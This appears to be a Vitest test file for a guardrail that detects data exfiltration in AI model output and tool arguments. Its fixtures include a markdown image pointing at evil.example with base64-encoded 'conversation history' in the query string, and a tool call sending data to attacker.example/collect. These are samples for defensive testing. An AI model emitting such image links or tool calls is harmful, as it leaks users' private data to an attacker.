import { describe, expect, it } from "vitest";
import { createExfiltrationDetector, urlDataSignal } from "./exfiltration";
import type { GuardFinding } from "../types";

const detector = createExfiltrationDetector();
const run = (text: string, channel: "model_output" | "tool_arguments" = "model_output", options: Record<string, unknown> = {}) =>
  detector.detect({ channel, content: text }, { text, options, now: () => 0 }) as GuardFinding[];

describe("exfiltration detector", () => {
  it("flags markdown images whose URL carries data", () => {
    const text = "Here is your summary. ![img](https://evil.example/pixel.png?data=U2VjcmV0IGNvbnZlcnNhdGlvbiBoaXN0b3J5IGhlcmU)";
    const findings = run(text);
    expect(findings).toHaveLength(1);
    expect(findings[0]!.score).toBeGreaterThanOrEqual(0.8);
    expect(text.slice(findings[0]!.spans[0]!.start, findings[0]!.spans[0]!.end)).toContain("![img](");
  });

  it("flags links with data-like query strings lower than images", () => {
    const image = run("![x](https://a.example/p?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)")[0]!.score;
    const link = run("[click](https://a.example/p?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa)")[0]!.score;
    expect(image).toBeGreaterThan(link);
    expect(link).toBeGreaterThan(0.3);
  });

  it("ignores plain links, images on allowlisted hosts and short URLs", () => {
    expect(run("See [the docs](https://docs.example.com/guide) for details.")).toEqual([]);
    expect(run("![logo](https://cdn.example.com/logo.png?v=3)", "model_output", { allowedHosts: ["*.example.com"] })).toEqual([]);
    expect(run("Visit https://example.com/pricing today.")).toEqual([]);
  });

  it("reports outbound URLs outside the allowlist in tool arguments", () => {
    const findings = run(JSON.stringify({ url: "https://attacker.example/collect" }), "tool_arguments", { allowedHosts: ["api.example.com"] });
    expect(findings).toHaveLength(1);
    expect(findings[0]!.score).toBeGreaterThanOrEqual(0.7);
    expect(findings[0]!.message).toContain("outside the allowlist");
    expect(run(JSON.stringify({ url: "https://api.example.com/v1" }), "tool_arguments", { allowedHosts: ["api.example.com"] })).toEqual([]);
  });

  it("scores URL data signals", () => {
    expect(urlDataSignal("https://x.example/a").score).toBe(0);
    expect(urlDataSignal("https://x.example/a?token=abcdefghijklmnopqrstuvwxyz0123456789").score).toBeGreaterThan(0.5);
    expect(urlDataSignal("not a url").reasons).toEqual(["unparseable"]);
  });
});
